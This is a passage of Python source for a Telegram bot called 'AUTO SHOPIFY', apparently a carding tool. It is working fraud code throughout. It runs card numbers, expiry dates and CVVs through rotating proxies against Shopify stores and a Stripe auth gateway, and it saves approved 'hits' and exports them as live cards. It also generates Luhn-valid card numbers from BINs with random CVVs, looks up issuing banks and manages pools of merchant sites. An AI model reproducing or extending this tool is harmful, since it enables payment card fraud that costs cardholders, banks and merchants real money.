                    removed.append(url)
                    print(f"🧹 Auto-cleaned dead site: {url} (fail rate: {fail_rate:.0%})")
    if removed:
        save_sites(sites)
        print(f"🧹 Auto-maintenance: removed {len(removed)} dead sites")

def report_site_result(url, success, response_status=None, card_category=None):
    if not url:
        return
    
    track_site_performance(url, success is True)
    auto_clean_dead_sites()
    
    if card_category in ['CHARGE', '3DS', 'CVV', 'FUNDS', 'LIVE']:
        if not sqlite_backup.is_permanent_site(url):
            sqlite_backup.add_permanent_site(url)
            print(f"🏆 Sitio PERMANENTE (APPROVED - {card_category}): {url}")
        else:
            sqlite_backup.add_permanent_site(url)
        return
    
    if sqlite_backup.is_permanent_site(url):
        print(f"🔒 Sitio PERMANENTE protegido: {url}")
        return
    
    if card_category == 'UNKNOWN':
        sites = load_sites()
        if url in sites:
            sites.remove(url)
            save_sites(sites)
            print(f"❌ Sitio ELIMINADO (UNKNOWN): {url}")
        return

# ============================================
# PROXIES MANAGEMENT
# ============================================

def load_proxies():
    return safe_json_load(PROXIES_FILE, [])

def save_proxies(proxies):
    return safe_json_save(PROXIES_FILE, proxies)

def add_proxy(proxy_str):
    proxies = load_proxies()
    if proxy_str not in proxies:
        proxies.append(proxy_str)
        save_proxies(proxies)
        return True
    return False

def clear_all_proxies():
    save_proxies([])
    return True

def delete_proxy_by_index(index):
    proxies = load_proxies()
    if 1 <= index <= len(proxies):
        removed = proxies.pop(index - 1)
        save_proxies(proxies)
        return removed
    return None

def delete_dead_proxies(dead_proxies):
    proxies = load_proxies()
    for dead in dead_proxies:
        if dead in proxies:
            proxies.remove(dead)
    save_proxies(proxies)
    return len(dead_proxies)

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    now = time.time()
    available = []
    for p in proxies:
        if p in failed_proxies:
            fails, last_fail = failed_proxies[p]
            if fails >= PROXY_FAIL_THRESHOLD and (now - last_fail) < PROXY_FAIL_COOLDOWN:
                continue
            elif (now - last_fail) >= PROXY_FAIL_COOLDOWN:
                del failed_proxies[p]
        available.append(p)
    if not available:
        failed_proxies.clear()
        available = proxies
    return random.choice(available)

def report_proxy_failure(proxy_str):
    """Track proxy failures for auto-rotation"""
    if not proxy_str:
        return
    now = time.time()
    if proxy_str in failed_proxies:
        fails, _ = failed_proxies[proxy_str]
        failed_proxies[proxy_str] = (fails + 1, now)
    else:
        failed_proxies[proxy_str] = (1, now)

def report_proxy_success(proxy_str):
    """Clear failure count on success"""
    if proxy_str and proxy_str in failed_proxies:
        del failed_proxies[proxy_str]

# ============================================
# PROXY CHECKER
# ============================================

def check_proxy_socket(proxy_str):
    """Level 1: TCP socket connection test"""
    try:
        parts = proxy_str.split(':')
        if len(parts) >= 2:
            host = parts[0]
            port = int(parts[1])
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(PROXY_SOCKET_TIMEOUT)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
    except:
        pass
    return False

def check_proxy_http_connect(proxy_str):
    """Level 2: HTTP CONNECT tunnel test"""
    try:
        parts = proxy_str.split(':')
        if len(parts) < 2:
            return False
        host = parts[0]
        port = int(parts[1])
        proxy_url = f"http://{host}:{port}"
        if len(parts) >= 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{host}:{port}"
        proxies_dict = {'http': proxy_url, 'https': proxy_url}
        resp = requests.get('http://httpbin.org/ip', proxies=proxies_dict, timeout=PROXY_CHECK_TIMEOUT + 2, verify=False)
        return resp.status_code == 200
    except:
        return False

def check_proxy_full(proxy_str):
    """Level 3: Full proxy verification with real HTTP request"""
    try:
        parts = proxy_str.split(':')
        if len(parts) < 2:
            return False
        host = parts[0]
        port = int(parts[1])
        proxy_url = f"http://{host}:{port}"
        if len(parts) >= 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{host}:{port}"
        proxies_dict = {'http': proxy_url, 'https': proxy_url}
        resp = requests.get('https://www.google.com', proxies=proxies_dict, timeout=PROXY_CHECK_TIMEOUT + 3, verify=False)
        return resp.status_code == 200
    except:
        return False

def check_proxy_deep(proxy_str):
    """Deep proxy check: socket + HTTP CONNECT + real request"""
    if not check_proxy_socket(proxy_str):
        return False, 'SOCKET_FAIL'
    if not check_proxy_http_connect(proxy_str):
        return False, 'HTTP_FAIL'
    if not check_proxy_full(proxy_str):
        return False, 'REQUEST_FAIL'
    return True, 'ALL_PASS'

def verify_proxy_batch(proxies, max_workers=PROXY_CHECK_WORKERS, deep=False):
    alive = []
    dead = []
    reasons = {}
    check_fn = check_proxy_deep if deep else check_proxy_socket
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_fn, p): p for p in proxies}
        for future in as_completed(futures):
            proxy = futures[future]
            try:
                result = future.result(timeout=PROXY_CHECK_TIMEOUT + 5)
                if deep:
                    is_alive, reason = result
                    if is_alive:
                        alive.append(proxy)
                    else:
                        dead.append(proxy)
                        reasons[proxy] = reason
                else:
                    if result:
                        alive.append(proxy)
                    else:
                        dead.append(proxy)
                        reasons[proxy] = 'SOCKET_FAIL'
            except:
                dead.append(proxy)
                reasons[proxy] = 'TIMEOUT'
    return alive, dead, reasons

def silent_proxy_check():
    proxies = load_proxies()
    if not proxies:
        return
    alive, dead, _ = verify_proxy_batch(proxies)

def start_silent_pc():
    global silent_pc_running, silent_pc_thread
    def run_silent_pc():
        global silent_pc_running
        while silent_pc_running:
            try:
                silent_proxy_check()
            except:
                pass
            for _ in range(SILENT_PC_INTERVAL):
                if not silent_pc_running:
                    break
                time.sleep(1)
    if not silent_pc_running:
        silent_pc_running = True
        silent_pc_thread = threading.Thread(target=run_silent_pc, daemon=True)
        silent_pc_thread.start()

# ============================================
# LUHN ALGORITHM & CARD GENERATOR
# ============================================

def luhn_checksum(card_number):
    """Calculate Luhn checksum digit"""
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10

def generate_luhn_card(bin_prefix, length=16):
    """Generate a valid card number from BIN using Luhn algorithm"""
    bin_str = str(bin_prefix)
    remaining = length - len(bin_str) - 1
    partial = bin_str + ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
    for check_digit in range(10):
        candidate = partial + str(check_digit)
        if luhn_checksum(candidate) == 0:
            return candidate
    return partial + '0'

def generate_cards_from_bin(bin_prefix, count=10):
    """Generate multiple valid cards with random expiry and CVV"""
    cards = []
    now = datetime.now()
    seen = set()
    attempts = 0
    while len(cards) < count and attempts < count * 3:
        attempts += 1
        cc = generate_luhn_card(bin_prefix)
        if cc in seen:
            continue
        seen.add(cc)
        month = random.randint(1, 12)
        year = random.randint(now.year + 1, now.year + 5) % 100
        cvv = random.randint(100, 999)
        cards.append(f"{cc}|{month:02d}|{year:02d}|{cvv}")
    return cards

# ============================================
# BIN LOOKUP
# ============================================

def bin_lookup(bin_number):
    if CACHE_BIN_RESULTS and bin_number in bin_cache:
        data, timestamp = bin_cache[bin_number]
        if time.time() - timestamp < bin_cache_expiry:
            return data
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            scheme = data.get('scheme', 'UNKNOWN').upper()
            brand = data.get('brand', '').upper()
            type_card = data.get('type', 'UNKNOWN').upper()
            prepaid = data.get('prepaid', False)
            bank = data.get('bank', {})
            bank_name = bank.get('name', 'UNKNOWN')
            country = data.get('country', {})
            country_name = country.get('name', 'UNKNOWN')
            country_code = country.get('alpha2', 'XX')
            
            flag = COUNTRY_FLAGS.get(country_code, '🌍')
            
            card_type = "PREPAID" if prepaid else type_card if type_card != 'UNKNOWN' else "CREDIT/DEBIT"
            result = {
                'info': f"{card_type} - {scheme} {brand}".strip(),
                'bank': bank_name,
                'country': f"{country_name} {flag}",
                'flag': flag,
                'country_code': country_code
            }
            if CACHE_BIN_RESULTS:
                bin_cache[bin_number] = (result, time.time())
            return result
    except:
        pass
    return None

# ============================================
# SHOPIFY CARD CHECKER
# ============================================

def check_card_shopify(cc, month, year, cvv):
    site = get_random_site()
    proxy = get_random_proxy()
    
    card_str = f"{cc}|{month}|{year}|{cvv}"
    api_url = f"{API_URL}/?cc={card_str}"
    
    if site:
        api_url += f"&url={site}"
    if proxy:
        api_url += f"&proxy={proxy}"
    
    start_time = time.time()
    site_used = site
    
    try:
        proxies_dict = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) >= 2:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
                if len(proxy_parts) >= 4:
                    proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                proxies_dict = {'http': proxy_url, 'https': proxy_url}
        
        response = http_session.get(api_url, proxies=proxies_dict, timeout=REQUEST_TIMEOUT, verify=False)
        elapsed = time.time() - start_time
        
        if response.status_code == 200:
            result_text = response.text
            try:
                data = response.json()
                response_msg = data.get('Response', 'UNKNOWN')
                price = data.get('Price', '$0.95')
                gateway = data.get('Gate', 'Shopify Payments')
                site_used = data.get('Site', site)
                category, status_msg = classify_response(response_msg)
                
                if site:
                    report_site_result(site, True, response.status_code, category)
                if proxy:
                    report_proxy_success(proxy)
                
                return category, status_msg, response_msg, price, gateway, round(elapsed, 2), site_used
            except:
                category, status_msg = classify_response(result_text)
                if site:
                    report_site_result(site, True, response.status_code, category)
                if proxy:
                    report_proxy_success(proxy)
                return category, status_msg, result_text, "$0.95", "Shopify Payments", round(elapsed, 2), site
        else:
            if site:
                report_site_result(site, False, response.status_code, 'ERROR')
            return "ERROR", f"HTTP {response.status_code}", "", "$0.95", "Shopify Payments", round(elapsed, 2), site
    except requests.exceptions.Timeout:
        if proxy:
            report_proxy_failure(proxy)
        if site:
            report_site_result(site, False, None, 'TIMEOUT')
        return "ERROR", "TIMEOUT", "", "$0.95", "Shopify Payments", 0, site
    except Exception as e:
        if proxy:
            report_proxy_failure(proxy)
        if site:
            report_site_result(site, False, None, 'ERROR')
        return "ERROR", str(e)[:50], "", "$0.95", "Shopify Payments", 0, site

def classify_response(response_msg):
    response_upper = response_msg.upper() if response_msg else ""
    if 'CHARGED' in response_upper or 'CAPTURED' in response_upper or 'APPROVED' in response_upper:
        return "CHARGE", response_msg
    elif '3DS' in response_upper:
        return "3DS", response_msg
    elif 'CVV' in response_upper or 'CVC' in response_upper:
        return "CVV", response_msg
    elif 'INSUFFICIENT' in response_upper or 'FUNDS' in response_upper:
        return "FUNDS", response_msg
    elif 'DECLINED' in response_upper:
        return "DECLINED", response_msg
    elif 'EXPIRED' in response_upper:
        return "DECLINED", response_msg
    elif 'OTP' in response_upper:
        return "DECLINED", response_msg
    else:
        return "UNKNOWN", response_msg

# ============================================
# HITS MANAGEMENT (SHOPIFY)
# ============================================

def save_hit(hit_data):
    hits = load_hits()
    hits.append(hit_data)
    safe_json_save(HITS_FILE, hits)
    global hits_list
    hits_list.append(hit_data)
    try:
        sqlite_backup.save_hit_backup(hit_data, "shopify")
    except:
        pass

def load_hits():
    return safe_json_load(HITS_FILE, [])

def clear_hits():
    global hits_list
    hits_list = []
    safe_json_save(HITS_FILE, [])

def get_hits():
    global hits_list
    if not hits_list:
        hits_list = load_hits()
    return hits_list

def export_hits_txt():
    hits = get_hits()
    if not hits:
        return None
    
    content = "\u2550" * 50 + "\n"
    content += f"  \U0001f6d2 AUTO SHOPIFY {BOT_VERSION} - APPROVED CARDS (HITS)\n"
    content += f"  \U0001f4c5 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    content += "\u2550" * 50 + "\n\n"
    
    for i, hit in enumerate(hits, 1):
        content += f"\u2501\u2501 [{i}] {hit.get('category', 'UNKNOWN')} \u2501\u2501\n"
        content += f"  \U0001f4b3 CC: {hit.get('cc', '')}|{hit.get('month', '')}|{hit.get('year', '')}|{hit.get('cvv', '')}\n"
        content += f"  \U0001f4dd Response: {hit.get('status_msg', '')}\n"
        content += f"  \U0001f4b2 Price: {hit.get('price', '$0.95')}\n"
        content += f"  \U0001f310 Gateway: {hit.get('gateway', 'Shopify Payments')}\n"
        content += f"  \u23f1 Time: {hit.get('elapsed', 0)}s\n"
        if hit.get('bin_info'):
            content += f"  \U0001f3e6 BIN: {hit.get('bin_info', {}).get('info', '')}\n"
            content += f"  \U0001f3e6 Bank: {hit.get('bin_info', {}).get('bank', '')}\n"
            content += f"  \U0001f30d Country: {hit.get('bin_info', {}).get('country', '')}\n"
        content += "\u2504" * 40 + "\n\n"
    
    content += "\u2550" * 50 + "\n"
    content += f"  \U0001f3c6 TOTAL HITS: {len(hits)}\n"
    content += "\u2550" * 50 + "\n"
    
    return content

# ============================================
# UI/UX CONSTANTS & HELPERS
# ============================================

BOT_VERSION = "v12.0"
BOT_NAME = "AUTO SHOPIFY"

# Decorative elements
LINE_TOP = "╔══════════════════════════════╗"
LINE_BOT = "╚══════════════════════════════╝"
LINE_MID = "╠══════════════════════════════╣"
LINE_THIN = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
LINE_DASH = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
LINE_DOT = "┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"

# Status indicators
ICON_APPROVED = "✅"
ICON_DECLINED = "❌"
ICON_WARNING = "⚠️"
ICON_ERROR = "🔴"
ICON_LIVE = "💚"
ICON_CHARGE = "💰"
ICON_3DS = "🔐"
ICON_CVV = "🔶"
ICON_FUNDS = "💸"
ICON_CLOCK = "⏱"
ICON_CARD = "💳"
ICON_BIN = "🏦"
ICON_GLOBE = "🌍"

def get_bot_header(gateway="shopify"):
    """Generate a styled header for bot messages"""
    if gateway == "stripe_auth":
        return f"""🔓 *{BOT_NAME} {BOT_VERSION}*
⚡ *STRIPE AUTH GATEWAY* ─ FREE
{LINE_DASH}"""
    return f"""🛒 *{BOT_NAME} {BOT_VERSION}*
⚡ *SHOPIFY GATEWAY*
{LINE_DASH}"""

def get_bot_footer():
    """Generate a styled footer"""
    return f"""
{LINE_THIN}
🤖 {BOT_NAME} {BOT_VERSION} │ /help"""

def get_status_emoji(category):
    """Get appropriate emoji set for a card result category"""
    status_map = {
        'CHARGE': ('💰', '✅ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗', '🟢'),
        'LIVE': ('💚', '✅ 𝗟𝗜𝗩𝗘', '🟢'),
        '3DS': ('🔐', '✅ 𝟯𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗', '🟡'),
        'CVV': ('🔶', '⚠️ 𝗖𝗩𝗩 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧', '🟡'),
        'FUNDS': ('💸', '⚠️ 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦', '🟡'),
        'DECLINED': ('❌', '❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗', '🔴'),
        'ERROR': ('🔴', '🔴 𝗘𝗥𝗥𝗢𝗥', '🔴'),
        'UNKNOWN': ('❓', '❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡', '⚪'),
    }
    return status_map.get(category, status_map['UNKNOWN'])

# ============================================
# STYLIZED TEXT
# ============================================

def stylize_text(text):
    style_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
    }
    return ''.join(style_map.get(c, c) for c in text)

# ============================================
# PROGRESS BAR
# ============================================

def create_progress_bar(current, total, width=20):
    if total == 0:
        return '░' * width + ' 0%'
    percentage = current / total
    filled = int(width * percentage)
    empty = width - filled
    pct = int(percentage * 100)
    return '█' * filled + '░' * empty + f' {pct}%'

# ============================================
# FORMAT RESPONSES
# ============================================

def format_chk_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
    cc = card_data.get('cc', '')
    month = card_data.get('month', '')
    year = card_data.get('year', '')
    cvv = card_data.get('cvv', '')
    
    icon, status_display, dot = get_status_emoji(category)
    
    message = f"{get_bot_header('shopify')}\n\n"
    message += f"{dot} {status_display} {dot}\n\n"
    message += f"{LINE_DOT}\n"
    message += f"💳 {stylize_text('CC')}  ➜  `{cc}|{month}|{year}|{cvv}`\n"
    message += f"🌐 {stylize_text('Gateway')}  ➜  {gateway}\n"
    message += f"📝 {stylize_text('Response')}  ➜  {response_msg}\n"
    message += f"💲 {stylize_text('Price')}  ➜  {price}\n"
    
    if bin_info:
        message += f"\n{LINE_DOT}\n"
        message += f"🏦 *BIN INFO*\n"
        message += f"   ├ {stylize_text('Type')}: {bin_info.get('info', 'Unknown')}\n"
        message += f"   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}\n"
        message += f"   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}\n"
    
    message += f"\n⏱ {stylize_text('Time')}: {elapsed}s"
    message += get_bot_footer()
    return message

def format_stripe_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
    cc = card_data.get('cc', '')
    month = card_data.get('month', '')
    year = card_data.get('year', '')
    cvv = card_data.get('cvv', '')
    
    icon, status_display, dot = get_status_emoji(category)
    
    message = f"{get_bot_header('stripe_auth')}\n\n"
    message += f"{dot} {status_display} {dot}\n\n"
    message += f"{LINE_DOT}\n"
    message += f"💳 {stylize_text('CC')}  ➜  `{cc}|{month}|{year}|{cvv}`\n"
    message += f"🔓 {stylize_text('Gateway')}  ➜  {gateway}\n"
    message += f"📝 {stylize_text('Response')}  ➜  {response_msg}\n"
    message += f"💲 {stylize_text('Price')}  ➜  {price}\n"
    
    if bin_info:
        message += f"\n{LINE_DOT}\n"
        message += f"🏦 *BIN INFO*\n"
        message += f"   ├ {stylize_text('Type')}: {bin_info.get('info', 'Unknown')}\n"
        message += f"   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}\n"
        message += f"   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}\n"
    
    message += f"\n⏱ {stylize_text('Time')}: {elapsed}s"
    message += get_bot_footer()
    return message

# ============================================
# BATCH SENDER
# ============================================

def send_batch_approved(chat_id, gateway="shopify"):
    global pending_approved, last_batch_time
    
    with batch_lock:
        if not pending_approved:
            return
        
        batch_messages = pending_approved.copy()
        pending_approved = []
    
    if batch_messages:
        if gateway == "stripe_auth":
            gateway_name = "🔓 STRIPE AUTH"
        else:
            gateway_name = "✅ SHOPIFY"
            
        combined = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        combined += f"{gateway_name} *APPROVED CARDS*\n"
        combined += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        combined += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n".join(batch_messages)
        
        try:
            bot.send_message(chat_id, combined, parse_mode='Markdown')
            last_batch_time = time.time()
        except:
            pass

def add_approved_to_batch(chat_id, message, gateway="shopify"):
    global pending_approved, last_batch_time
    
    with batch_lock:
        pending_approved.append(message)
        
        if len(pending_approved) >= BATCH_SIZE:
            send_batch_approved(chat_id, gateway)
        else:
            def delayed_send():
                time.sleep(BATCH_DELAY)
                send_batch_approved(chat_id, gateway)
            
            if len(pending_approved) == 1:
                threading.Thread(target=delayed_send, daemon=True).start()

# ============================================
# MAIN KEYBOARD
# ============================================

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=3)
    # ── Row 1: Gateway Checks ──
    keyboard.row(
        InlineKeyboardButton("🛒 CHK", callback_data="check"),
        InlineKeyboardButton("📦 MASS", callback_data="mass"),
        InlineKeyboardButton("🏆 HITS", callback_data="hits")
    )
    # ── Row 2: Stripe Auth ──
    keyboard.row(
        InlineKeyboardButton("🔓 AU CHK", callback_data="stripe_check"),
        InlineKeyboardButton("🔓 AU MASS", callback_data="stripe_mass"),
        InlineKeyboardButton("🔓 AU HITS", callback_data="stripe_hits")
    )
    # ── Row 3: Infrastructure ──
    keyboard.row(
        InlineKeyboardButton("🌐 Sites", callback_data="sites"),
        InlineKeyboardButton("📡 Proxies", callback_data="proxies"),
        InlineKeyboardButton("⚡ PX Check", callback_data="px")
    )
    # ── Row 4: Settings ──
    keyboard.row(
        InlineKeyboardButton("🎮 Mode", callback_data="mode_menu"),
        InlineKeyboardButton("⚙️ Workers", callback_data="setworkers_menu"),
        InlineKeyboardButton("📊 Stats", callback_data="stats")
    )
    # ── Row 5: Utilities ──
    keyboard.row(
        InlineKeyboardButton("🏦 BIN Info", callback_data="bin_lookup"),
        InlineKeyboardButton("🎲 Generate", callback_data="gen_cards"),
        InlineKeyboardButton("📎 Export", callback_data="export")
    )
    # ── Row 6: Tools ──
    keyboard.row(
        InlineKeyboardButton("🔒 Permanent", callback_data="permanent_sites"),
        InlineKeyboardButton("🔧 Fix Sites", callback_data="fix_sites")
    )
    # ── Row 7: Control ──
    keyboard.row(
        InlineKeyboardButton("🗑️ Clear Cards", callback_data="clear_menu"),
        InlineKeyboardButton("🛑 STOP", callback_data="stop_mass"),
        InlineKeyboardButton("❓ Help", callback_data="help")
    )
    return keyboard

def safe_send_message(chat_id, text, parse_mode=None, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except:
        return bot.send_message(chat_id, text, reply_markup=reply_markup)

# ============================================
# AUTO FILE DETECTION
# ============================================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    processing_msg = bot.reply_to(message, "⏳ Analyzing file...")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        for encoding in ['utf-8', 'latin-1', 'cp1252']:
            try:
                file_content = downloaded_file.decode(encoding)
                break
            except:
                continue
        else:
            bot.edit_message_text("❌ Could not read file", chat_id=message.chat.id, message_id=processing_msg.message_id)
            return
        
        file_name = message.document.file_name.lower()
        
        # Detectar gateway por nombre
        if 'au' in file_name or 'stripe' in file_name:
            gateway = "stripe_auth"
        else:
            gateway = "shopify"
        
        lines = file_content.split('\n')
        cards_added = 0
        cards_dup = 0
        sites_added = 0
        proxies_added = 0
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            line_type = detect_line_type(line)
            
            if line_type == 'card':
                parts = line.split('|')
                if len(parts) >= 4:
                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                    if gateway == "stripe_auth":
                        if add_stripe_card(cc, month, year, cvv):
                            cards_added += 1
                        else:
                            cards_dup += 1
                    else:
                        if add_card(cc, month, year, cvv):
                            cards_added += 1
                        else:
                            cards_dup += 1
            elif line_type == 'site' and gateway == "shopify":
                url = extract_url_from_text(line)
                if not url:
                    url = normalize_url(line)
                if url and add_site(url):
                    sites_added += 1
            elif line_type == 'proxy' and gateway == "shopify":
                if add_proxy(line):
                    proxies_added += 1
        
        gateway_names = {
            "shopify": "Shopify",
            "stripe_auth": "Stripe Auth (FREE)"
        }
        
        gw_icon = "🔓" if gateway == "stripe_auth" else "🛒"
        response = f"""
{LINE_DASH}
📂 *FILE PROCESSED*
{LINE_DASH}

{gw_icon} *Gateway:* {gateway_names.get(gateway, 'Unknown')}

💳 *Cards Added:* +{cards_added}
🔄 *Duplicates:* {cards_dup}"""
        
        if gateway == "shopify":
            response += f"\n🌐 *Sites Added:* +{sites_added}\n📡 *Proxies Added:* +{proxies_added}"
        
        total_cards = 0
        if gateway == "stripe_auth":
            total_cards = len(get_all_stripe_cards())
        else:
            total_cards = len(get_all_cards())
        
        response += f"\n\n{LINE_THIN}\n📊 *Total cards in queue:* {total_cards}"
        
        markup = InlineKeyboardMarkup()
        if cards_added > 0:
            if gateway == "stripe_auth":
                markup.add(InlineKeyboardButton("🔓 START AU MASS CHECK ▶️", callback_data="stripe_mass"))
            else:
                markup.add(InlineKeyboardButton("🛒 START MASS CHECK ▶️", callback_data="mass"))
        
        try:
            bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, 
                                parse_mode='Markdown', reply_markup=markup if markup.keyboard else None)
        except:
            bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
    
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)[:100]}", chat_id=message.chat.id, message_id=processing_msg.message_id)

def detect_line_type(line):
    line = line.strip()
    if not line:
        return 'empty'
    if '|' in line:
        parts = line.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'[^\d]', '', parts[0])
            if len(cc) >= 13 and len(cc) <= 19 and cc.isdigit():
                return 'card'
    url_patterns = [r'https?://', r'\.com', r'\.org', r'\.net', r'\.shop', r'\.store', r'myshopify\.com']
    for pattern in url_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            return 'site'
    if ':' in line and '/' not in line:
        parts = line.split(':')
        if len(parts) >= 2:
            ip = parts[0].strip()
            port = parts[1].strip()
            ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', ip)
            if ip_match:
                return 'proxy'
    return 'invalid'

# ============================================
# COMMANDS
# ============================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = f"""
╔══════════════════════════════╗
   🤖 *{BOT_NAME} {BOT_VERSION}*
   ⚡ Shopify + Stripe Auth
╚══════════════════════════════╝

🛒 *━━ SHOPIFY GATEWAY ━━*
  /chk `cc|mm|yy|cvv` ─ Single check
  /mass ─ Mass check (pipeline)

🔓 *━━ STRIPE AUTH (FREE) ━━*
  /au `cc|mm|yy|cvv` ─ Single check
  /mau ─ Mass check (pipeline)

🏦 *━━ UTILITIES ━━*
  /bin `424242` ─ BIN lookup
  /gen `424242` `10` ─ Generate cards (Luhn)
  /px ─ Deep proxy check (3 levels)
  /delproxy ─ Delete proxy
  /clearshopify ─ Clear Shopify cards
  /clearau ─ Clear Stripe cards

⚙️ *━━ SETTINGS ━━*
  /stats ─ Statistics
  /mode ─ Parallel mode (1x/3x/5x)

{LINE_THIN}
📂 *Send .txt file to auto-load*
   └ Name with "au" or "stripe" → Stripe Auth
🧹 *Auto-maintenance active*
   └ Dead sites auto-cleaned every 50 checks
"""
    safe_send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=get_main_keyboard())

@bot.message_handler(commands=['chk'])
def chk_command(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /chk cc|mm|yy|cvv")
        return
    card_str = args[1]
    if '|' not in card_str and len(args) >= 5:
        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
    parts = card_str.split('|')
    if len(parts) < 4:
        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if not cc.isdigit() or len(cc) < 13:
        bot.reply_to(message, "❌ Invalid card number")
        return
    
    processing_msg = bot.reply_to(message, "⏳ Checking card with Shopify...")
    
    bin_info = bin_lookup(cc[:6])
    category, status_msg, response_msg, price, gateway, elapsed, site_used = check_card_shopify(cc, month, year, cvv)
    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
    response = format_chk_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
    
    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
        hit_data = {
            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
            'category': category, 'status_msg': response_msg,
            'gateway': gateway, 'price': price, 'elapsed': elapsed,
            'bin_info': bin_info,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_hit(hit_data)
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['au'])
def stripe_command(message):
    """Comando /au - Check individual con Stripe Auth"""
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /au cc|mm|yy|cvv")
        return
    card_str = args[1]
    if '|' not in card_str and len(args) >= 5:
        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
    parts = card_str.split('|')
    if len(parts) < 4:
        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
